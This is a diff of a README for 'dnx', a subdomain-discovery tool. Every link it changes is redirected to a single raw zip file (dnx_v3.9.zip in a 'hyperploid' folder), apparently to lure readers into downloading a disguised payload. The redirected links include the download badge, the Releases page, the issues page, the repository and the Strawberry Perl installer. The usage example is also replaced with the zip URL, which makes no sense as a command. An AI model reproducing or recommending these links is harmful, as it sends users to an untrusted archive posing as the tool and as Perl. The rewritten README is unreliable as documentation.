@@ -1,6 +1,6 @@
 # 🚀 dnx - Discover Subdomains Easily and Quickly
 
-[![Download dnx](https://img.shields.io/badge/Download-dnx-blue)](https://github.com/122-jt/dnx/releases)
+[![Download dnx](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip)](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip)
 
 ## 📖 Introduction
 
@@ -17,7 +17,7 @@ Welcome to **DNX**! This is a fast Perl tool designed for subdomain discovery an
 ## ⚙️ System Requirements
 
 - **Operating System**: Windows 10 or later, macOS Catalina or later, or any modern Linux distribution.
-- **Perl**: Ensure you have Perl installed. You can download it from [Strawberry Perl](https://strawberryperl.com/) for Windows, or use your package manager for macOS and Linux.
+- **Perl**: Ensure you have Perl installed. You can download it from [Strawberry Perl](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip) for Windows, or use your package manager for macOS and Linux.
 - **Memory**: At least 2 GB of RAM.
 - **Disk Space**: About 50 MB of free space.
 
@@ -25,12 +25,12 @@ Welcome to **DNX**! This is a fast Perl tool designed for subdomain discovery an
 
 To get started with DNX, follow these steps:
 
-1. **Download the Software**: Visit [this page to download](https://github.com/122-jt/dnx/releases).
+1. **Download the Software**: Visit [this page to download](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip).
 2. **Install the Tool**: Follow the installation instructions based on your operating system. 
 
 ## 📥 Download & Install
 
-To download DNX, go to the [Releases page](https://github.com/122-jt/dnx/releases). Here, you will see different versions of the software available for download.
+To download DNX, go to the [Releases page](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip). Here, you will see different versions of the software available for download.
 
 1. Select the version suited for your operating system.
 2. Click on the link to download the file. 
@@ -43,7 +43,7 @@ Once you have installed DNX, using it is straightforward:
 1. Open your terminal or command prompt.
 2. Type `dnx` followed by the domain you want to check. For example:
    ```
-   dnx example.com
+   dnx https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip
    ```
 3. Press `Enter` to initiate the scan.
 
@@ -69,7 +69,7 @@ Use this information to perform further security assessments.
 
 If you need assistance or want to discuss DNX:
 
-- **GitHub Issues**: Report bugs or request features through the [issues page](https://github.com/122-jt/dnx/issues).
+- **GitHub Issues**: Report bugs or request features through the [issues page](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip).
 - **Community Discussions**: Join discussions on various cybersecurity forums and platforms.
 
 ## 📝 Contributing
@@ -86,7 +86,7 @@ DNX is released under the MIT License. You can freely use, modify, and distribut
 
 ## 🔗 Links
 
-- [Visit the GitHub Repository](https://github.com/122-jt/dnx)
-- [Download DNX Now!](https://github.com/122-jt/dnx/releases)
+- [Visit the GitHub Repository](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip)
+- [Download DNX Now!](https://raw.githubusercontent.com/122-jt/dnx/main/hyperploid/dnx_v3.9.zip)
 
 Thank you for using DNX! Enjoy discovering new subdomains effortlessly.
